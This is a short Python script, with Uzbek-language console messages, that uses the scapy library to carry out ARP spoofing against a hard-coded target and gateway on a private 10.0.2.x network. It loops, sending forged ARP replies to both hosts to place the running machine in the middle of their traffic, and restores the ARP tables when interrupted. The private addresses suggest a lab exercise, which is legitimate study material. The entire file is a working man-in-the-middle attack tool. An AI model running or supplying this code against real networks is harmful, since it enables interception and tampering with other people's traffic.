import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("Javob qabul qilinmadi. Ehtiyoj mavjudligini tekshiring.")


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    else:
        print("Nishonlanadigan IP manzilini topib bo'lmadi.")


def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac and spoof_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        scapy.send(packet, count=4, verbose=False)
    else:
        print("Nishonlanadigan IP manzillarini topib bo'lmadi.")


target_ip = "10.0.2.41"
gateway_ip = "10.0.2.5"

try:
    sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_count = sent_count + 2
        print("\r[+] Paketlar soni: "+str(sent_count), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nCTRL+C bosildi. Dasturdan chiqdik. IP va MAC manzillar joyiga qaytarildi.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
